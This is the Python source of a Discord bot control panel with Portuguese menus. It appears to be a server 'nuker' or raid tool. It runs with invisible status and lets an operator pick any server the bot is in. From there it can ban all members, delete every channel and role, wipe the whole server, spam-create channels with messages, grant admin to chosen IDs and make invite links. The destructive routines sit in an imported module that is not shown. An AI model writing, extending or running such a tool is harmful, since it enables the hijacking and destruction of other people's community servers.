import discord
from discord.ext import commands
import os
import asyncio
from colorama import Fore, Style, init
import logging

init()

import actions
from config import TOKEN

logging.basicConfig(level=logging.CRITICAL)
logging.getLogger("discord").setLevel(logging.CRITICAL)

intents = discord.Intents.all()

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    status=discord.Status.invisible
)

def menu(guild):

    os.system("cls" if os.name == "nt" else "clear")

    roxo = Fore.MAGENTA

    print(roxo + """
    ____                                  
   / __ \____ _      _____  _____         
  / /_/ / __ \ | /| / / _ \/ ___/         
 / ____/ /_/ / |/ |/ /  __/ /             
/_/    \____/|__/|__/\___/_/     
""" + Style.RESET_ALL)

    print(roxo + "dev @favoreci\n" + Style.RESET_ALL)

    print("-----------------------------------------")
    print(f"Servidor selecionado: {guild.name}")
    print("----------------------------------------\n")

    print("[1] Limpar mensagens de um canal")
    print("[2] Banir todos os membros")
    print("[3] Excluir todos os canais")
    print("[4] Excluir todos os cargos")
    print("[5] RESET TOTAL DO SERVIDOR")
    print("[6] Criar canais de chat")
    print("[7] Dar cargo ADMIN por ID")
    print("[8] Trocar servidor")
    print("[9] Desbanir usuário por ID")
    print("[10] Criar link de convite do servidor")
    print("[0] Sair\n")


async def escolher_servidor():

    os.system("cls" if os.name == "nt" else "clear")

    print("""
╔════════════════════════════════════╗
║            SERVIDORES              ║
╚════════════════════════════════════╝
""")

    for i, guild in enumerate(bot.guilds):

        print(f"[{i+1}] {guild.name}")
        print(f"    ID: {guild.id}")
        print(f"    Membros: {guild.member_count}")
        print(f"    Canais: {len(guild.channels)}")
        print(f"    Cargos: {len(guild.roles)}\n")

    escolha = int(await asyncio.to_thread(input, "Escolha o servidor: "))

    return bot.guilds[escolha - 1]


async def animacao_login():

    print("Iniciando sistema", end="", flush=True)

    for _ in range(3):
        await asyncio.sleep(0.4)
        print(".", end="", flush=True)

    print("\n")


async def painel():

    await bot.wait_until_ready()

    guild = await escolher_servidor()

    while True:

        menu(guild)

        opcao = await asyncio.to_thread(input, "Escolha uma opção: ")

        #clean canakl
        if opcao == "1":

            canal = int(await asyncio.to_thread(input, "\nDigite o ID do canal: "))
            await actions.limpar_canal(guild, canal)

        #banir todos
        elif opcao == "2":

            await actions.banir_todos(guild)

        #   deletar canais
        elif opcao == "3":

            await actions.deletar_canais(guild)

        #   deletar cargos
        elif opcao == "4":

            await actions.deletar_cargos(guild)

        #   reset total
        elif opcao == "5":

            confirm = await asyncio.to_thread(input, "\nTem certeza? (sim/nao): ")

            if confirm.lower() == "sim":
                await actions.reset_total(guild)

        #   criar canais
        elif opcao == "6":

            quantidade = int(await asyncio.to_thread(input, "\nQuantos canais criar: "))
            nome = await asyncio.to_thread(input, "Nome base do canal: ")

            mensagem = await asyncio.to_thread(
                input,
                "Mensagem para enviar (ENTER para nenhuma): "
            )

            await actions.criar_canais(guild, quantidade, nome, mensagem)

        #   dar admin
        elif opcao == "7":

            ids = await asyncio.to_thread(
                input,
                "\nDigite os IDs (ou ENTER para dar admin para o dono): "
            )

            if ids.strip() == "":
                dono = guild.owner
                lista_ids = [str(dono.id)]
            else:
                lista_ids = ids.split()

            await actions.dar_admin(guild, lista_ids)

        #   trocar servidor
        elif opcao == "8":

            print("\nTrocando servidor...\n")

            guild = await escolher_servidor()

            print(f"\nServidor selecionado: {guild.name}")
            await asyncio.sleep(1)
            
            # desbanir usuario 
        elif opcao == "9":

            user_id = await asyncio.to_thread(
                input,
                "\nDigite o ID do usuário para desbanir: "
            )

            await actions.desbanir_usuario(guild, user_id)

        elif opcao == "10":

            await actions.criar_convite(guild)

        # sair
        elif opcao == "0":

            print("\nSaindo...\n")
            await bot.close()
            break

        await asyncio.to_thread(input, "\nPressione ENTER para voltar ao menu...")


@bot.event
async def on_ready():

    os.system("cls" if os.name == "nt" else "clear")

    await animacao_login()

    print("Bot conectado como:", bot.user)

    bot.loop.create_task(painel())


bot.run(TOKEN)